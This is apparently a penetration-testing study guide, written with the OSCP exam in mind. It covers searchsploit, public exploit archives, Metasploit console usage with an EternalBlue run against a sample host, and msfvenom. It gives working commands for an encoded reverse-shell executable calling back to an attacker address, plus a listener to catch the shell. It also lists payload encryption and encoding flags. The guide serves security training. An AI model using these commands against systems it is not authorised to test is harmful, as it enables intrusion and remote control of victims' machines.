# Exploits

## 1. Searchsploit

A command line search tool for **Exploit-DB** that also allows you to take a copy of Exploit Database with you, everywhere you go.

```bash
kali@kali:~$ searchsploit afd windows local
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)              | windows_x86/local/40564.c
Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                            | windows/dos/18755.c
Microsoft Windows - 'AfdJoinLeaf' Local Privilege Escalation (MS11-080) (Metasploit)   | windows/local/21844.rb
Microsoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040) | windows_x86-64/local/39525.py
Microsoft Windows 7 (x86) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040) | windows_x86/local/39446.py
Microsoft Windows XP - 'afd.sys' Local Kernel Denial of Service                        | windows/dos/17133.c
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin) (MS08-066) | windows/local/6757.txt
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080)            | windows/local/18176.py
--------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Result

kali@kali:~$ searchsploit -m [PATH]
```

---

## 2. Other Public Sources

### Exploit-DB

[Exploit Database (Exploit-DB)](https://www.exploit-db.com) is a widely used archive of public exploits and proof-of-concept (PoC) code. It is maintained by OffSec.

* Contains verified public exploits and PoCs
* Searchable by CVE, platform, software, or exploit type
* Often includes detailed exploit code that can be modified for practical use
* Integrated with SearchSploit (Kali Linux tool)

### Packet Storm

Packet Storm is a long-running security research portal that hosts advisories, exploits, tools, and whitepapers.

* Publishes new vulnerabilities and exploits regularly
* Includes security tools and proof-of-concept code
* Useful for finding less mainstream or newly disclosed exploits

Website: `https://packetstorm.news/`

### CVE Details

CVE Details provides structured information about CVEs and vulnerability statistics.

We can check for public exploits related to a vulnerability or a specific service version on CVE databases such as:

* [CVE Details](https://www.cvedetails.com)
* [MITRE (CVE List)](https://cve.mitre.org)
* [National Vulnerability Database (NVD)](https://nvd.nist.gov)

These resources are:

* Useful for assessing the severity and impact of a vulnerability
* Helpful for identifying references and related advisories
* Sometimes linked to available Metasploit (MSF) modules

### GitHub

GitHub is another important source for finding public exploit code and security tools.

* Many researchers publish proof-of-concept exploits
* Advanced search can be used to find exploits by CVE ID or software version
* Repositories often contain scripts written in Python, Bash, Ruby, or C
* Code quality varies, so manual review and testing are required

### OSCP and Metasploit Usage

The OffSec Certified Professional (OSCP) exam encourages candidates to develop a strong understanding of how exploits work rather than relying entirely on automated frameworks.

During the OSCP exam:

* The use of Metasploit Framework (MSF) is restricted (only limited usage is allowed).
* Candidates are expected to understand exploit logic and modify exploit code manually when necessary.
* Proficiency in scripting or programming languages (e.g., Python, Bash, or C) is important to adjust payloads, IP addresses, ports, offsets, or other exploit parameters.

This approach ensures that candidates can adapt public exploits to specific environments instead of simply running them without understanding their functionality.

---

## 3. Metasploit Framework Console

The Metasploit Framework also provides options other than exploits, such as auxiliary, payloads, NOPs, post, encoders, and evasion modules.

```bash
sudo systemctl start postgresql
```

It starts the PostgreSQL database service, which Metasploit uses to store data like discovered hosts, open ports, vulnerabilities, credentials, and sessions. This allows Metasploit to organize results, track progress, and generate reports efficiently. Without the database service, `msfconsole` still works, but it won’t save or manage data persistently. This is usually fine for CTFs or short testing sessions where reporting and long-term data tracking aren’t required.

> **Note:** Metasploit does still store some things temporarily in memory during the session. The loss happens when you exit—without the database.

```bash
msfconsole  # Launch Metasploit Framework console in interactive mode

msfconsole -q                     # Start msfconsole in quiet mode (no banner)
msfconsole -x "<commands>"       # Execute commands on startup

# Example
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; run"
```

```bash
# Metasploit (msfconsole) – Basic Commands

search <keyword>                     # Find modules
search platform:windows type:exploit

use <number | module/path>          # Select module

info                                # Show module details

show options                        # Show required settings
show payloads                      # Show available payloads
show targets                       # Show available targets

set <option> <value>               # Set option (RHOSTS, LHOST, etc.)
setg <option> <value>              # Set global option

unset <option>                     # Remove option
unsetg <option>                    # Remove global option

check                              # Check vulnerability (if supported)

run                                # Execute module
exploit                            # Same as run

back                               # Return to main menu
exit                               # Exit msfconsole

sessions          # List active sessions
sessions -i <id>  # Interact with a specific session
sessions -k <id>  # Kill a specific session
sessions -l       # List sessions (alternative flag)
sessions -h       # Show session command help

# Workflow
msfconsole → search → use → info → show options → set → check → exploit → sessions → back → exit
```

`sessions` is used after successful exploitation to manage active shells or Meterpreter sessions. It lets you view, interact with, or terminate compromised connections. This is where post-exploitation begins.

### **Demonstration**

```msf
msf > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/
   .
   .
   .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10 
RHOSTS => 192.168.1.10
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
.
.
.
```

---

### **Adding a New Module**

`/usr/share/metasploit-framework` -> Main Metasploit directory where modules and related data are stored in an organized manner

* Download the module (e.g., from exploit-db.com)

* Place it in the appropriate directory based on its type:
  * exploits   → modules/exploits/
  * auxiliary  → modules/auxiliary/
  * post       → modules/post/
  * payloads   → modules/payloads/

* Restart msfconsole or run:
  * `reload_all` -> It refreshes Metasploit and loads the new module.

---

## 4. MSFvenom

It is used to generate custom payloads.

```bash
# msfvenom – Important Flags

-p <payload>            # Specify payload
-i <count>              # Number of payload iterations (for encoding)
-f <format>             # Output format (exe, elf, raw, python, c, etc.)
-e <encoder>            # Specify encoder
-a <architecture>       # Specify architecture (x86, x64, arm, etc.)
--platform <platform>   # Specify target platform (windows, linux, android, etc.)
-x <template>           # Use custom executable as template

--encrypt <type>       # Encrypt payload (aes256, xor, rc4, etc.)
--encrypt-key <KEY>    # Encryption key

-l encoders            # List available encoders
-l formats             # List available output formats
-l platforms           # List available platforms
-l payloads            # List available payloads
```

**Example:**

Generate the payload and deliver it to the target system.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o shell.exe
```

Now set up a listener on the attacker's machine.

```msf
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.7
lhost => 192.168.1.7
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.7:4444
```

When the payload is executed, a shell connection will be established to the attacker's machine.

> **Note:** A `netcat` listener can work with **generic shell payloads** such as `windows/shell/reverse_tcp`, but it will not work with `meterpreter` payloads, which require the Metasploit multi/handler.

---
